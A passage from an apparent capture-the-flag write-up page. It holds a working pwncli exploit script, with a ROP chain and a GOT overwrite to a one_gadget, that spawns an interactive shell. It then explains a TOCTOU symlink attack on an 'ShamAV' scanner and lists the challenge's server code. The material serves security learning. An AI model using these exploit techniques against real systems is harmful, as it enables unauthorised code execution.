+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;elf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;libc&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="s2">&#34;To get started, tell us how you feel</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;great&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sa</span><span class="p">(</span><span class="s2">&#34;we will have your very own horoscope</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x70</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x470</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x4007cf</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">length</span><span class="o">=</span><span class="mh">0x8c</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">CurrentGadgets</span><span class="o">.</span><span class="n">set_find_area</span><span class="p">(</span><span class="n">find_in_libc</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="n">flat_z</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x470</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">CurrentGadgets</span><span class="o">.</span><span class="n">write_by_magic</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span><span class="p">,</span> <span class="n">get_current_one_gadget_from_libc</span><span class="p">()[</span><span class="mi">1</span><span class="p">]),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="o">.</span><span class="n">puts</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x70</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x400</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x40080D</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">length</span><span class="o">=</span><span class="mh">0x8c</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508221234264.png' alt="image-20220508221234264"></p>
+<h2 class="heading-element" id="shamav"><span>ShamAV</span>
+  <a href="#shamav" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>It&rsquo;s about <code>toutoc</code> vuln, that is <strong>time of use time of change/check</strong>. Soft symbol link attack is used in this challenge.</p>
+<p>Tips: <code>shutil.copyfile(src, dst)</code> will raise an exception if <code>src</code> is  not readable; If <code>dst</code> already exists, it will be replaced.</p>
+<h3 class="heading-element" id="analysis-of-server"><span>Analysis of Server</span>
+  <a href="#analysis-of-server" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Download the <code>server.py</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="err">#</span><span class="o">!</span><span class="w"> </span><span class="o">/</span><span class="nn">usr/bin/</span><span class="n">env</span><span class="w"> </span><span class="n">python3</span><span class="w">                                                                                                                                                                                 </span><span class="p">[</span><span class="err">40</span><span class="o">/</span><span class="err">1990</span><span class="p">]</span><span class="n">import</span><span class="w"> </span><span class="n">base64</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="n">os</span><span class="p">,</span><span class="w"> </span><span class="n">hashlib</span><span class="p">,</span><span class="w"> </span><span class="n">shutil</span><span class="p">,</span><span class="w"> </span><span class="n">sys</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">base64</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="n">os</span><span class="p">,</span><span class="w"> </span><span class="n">hashlib</span><span class="p">,</span><span class="w"> </span><span class="n">shutil</span><span class="p">,</span><span class="w"> </span><span class="n">sys</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">USER_UID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">1002</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CTR_LENGTH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">256</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">STDIO_DEBUG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">False</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ctr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">malware_hashes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">set</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">with</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="err">&#39;</span><span class="n">malware</span><span class="o">-</span><span class="n">hashes</span><span class="p">.</span><span class="n">txt</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">f</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">for</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">f</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">malware_hashes</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">with</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="err">&#39;</span><span class="n">seed</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">f</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">Read</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">behavior</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">reproduce</span><span class="o">-</span><span class="n">able</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">Make</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">lot</span><span class="w"> </span><span class="n">easier</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="n">log</span><span class="p">(</span><span class="n">s</span><span class="o">:</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="n">flush</span><span class="o">=</span><span class="n">True</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="n">genrandom</span><span class="p">()</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">global</span><span class="w"> </span><span class="n">ctr</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">ctr</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">CTR_LENGTH</span><span class="p">,</span><span class="w"> </span><span class="n">byteorder</span><span class="o">=</span><span class="err">&#39;</span><span class="n">little</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">seed</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ctr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="err">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">return</span><span class="w"> </span><span class="n">result</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="n">is_malware</span><span class="p">(</span><span class="n">file</span><span class="o">:</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">with</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">rb</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">f</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">return</span><span class="w"> </span><span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">malware_hashes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="n">_scan</span><span class="p">(</span><span class="n">path</span><span class="o">:</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">I</span><span class="p">]</span><span class="w"> </span><span class="n">Scanning</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="p">{</span><span class="n">path</span><span class="p">}</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">try</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">if</span><span class="w"> </span><span class="n">os</span><span class="p">.</span><span class="n">lstat</span><span class="p">(</span><span class="n">path</span><span class="p">).</span><span class="n">st_uid</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">USER_UID</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">return</span><span class="w"> </span><span class="err">&#34;</span><span class="n">You</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="kd">permission</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">item</span><span class="err">&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">except</span><span class="w"> </span><span class="n">OSError</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">e</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">return</span><span class="w"> </span><span class="n">f</span><span class="err">&#39;</span><span class="n">Error</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">OS</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">e</span><span class="p">}</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">target_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="err">&#39;</span><span class="o">/</span><span class="nn">home/antivirus/quarantine/</span><span class="n">sham</span><span class="o">-</span><span class="n">av</span><span class="o">-</span><span class="p">{</span><span class="n">genrandom</span><span class="p">()}</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">D</span><span class="p">]</span><span class="w"> </span><span class="n">Copying</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="p">{</span><span class="n">path</span><span class="p">}</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="p">{</span><span class="n">target_path</span><span class="p">}</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">try</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">shutil</span><span class="p">.</span><span class="n">copyfile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">target_path</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">if</span><span class="w"> </span><span class="n">is_malware</span><span class="p">(</span><span class="n">target_path</span><span class="p">)</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">I</span><span class="p">]</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="n">malware</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="p">{</span><span class="n">path</span><span class="p">}</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">return</span><span class="w"> </span><span class="n">f</span><span class="err">&#39;</span><span class="o">*****</span><span class="w"> </span><span class="n">Malware</span><span class="w"> </span><span class="n">detected</span><span class="o">!</span><span class="w"> </span><span class="n">File</span><span class="w"> </span><span class="n">quarantined</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="p">{</span><span class="n">target_path</span><span class="p">}</span><span class="w"> </span><span class="o">*****</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">except</span><span class="w"> </span><span class="n">IsADirectoryError</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">e</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">return</span><span class="w"> </span><span class="n">f</span><span class="err">&#39;</span><span class="n">An</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">occurred</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">e</span><span class="p">}</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">return</span><span class="w"> </span><span class="err">&#34;</span><span class="n">File</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">completed</span><span class="p">.</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">malware</span><span class="w"> </span><span class="n">detected</span><span class="p">.</span><span class="err">&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="n">scan</span><span class="p">(</span><span class="n">path</span><span class="o">:</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_scan</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">I</span><span class="p">]</span><span class="w"> </span><span class="n">Scan</span><span class="w"> </span><span class="n">complete</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">path</span><span class="p">}</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">return</span><span class="w"> </span><span class="n">res</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SOCKET_FILE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">socket</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">4096</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="n">recvall</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">chunks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">while</span><span class="w"> </span><span class="n">True</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">chunk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">BS</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">if</span><span class="w"> </span><span class="n">chunk</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">b</span><span class="err">&#39;&#39;</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">return</span><span class="w"> </span><span class="n">b</span><span class="err">&#39;&#39;</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">chunks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">while</span><span class="w"> </span><span class="n">True</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">if</span><span class="w"> </span><span class="n">STDIO_DEBUG</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">try</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">except</span><span class="w"> </span><span class="n">EOFError</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">break</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">print</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="n">Scan</span><span class="w"> </span><span class="n">result</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">scan</span><span class="p">(</span><span class="n">path</span><span class="p">)}</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">else</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">with</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_UNIX</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">s</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">try</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">os</span><span class="p">.</span><span class="n">unlink</span><span class="p">(</span><span class="n">SOCKET_FILE</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">except</span><span class="w"> </span><span class="n">FileNotFoundError</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">pass</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">SOCKET_FILE</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">os</span><span class="p">.</span><span class="n">chmod</span><span class="p">(</span><span class="n">SOCKET_FILE</span><span class="p">,</span><span class="w"> </span><span class="err">0</span><span class="n">o777</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">while</span><span class="w"> </span><span class="n">True</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">I</span><span class="p">]</span><span class="w"> </span><span class="n">Ready</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">next</span><span class="w"> </span><span class="n">client</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span><span class="w">
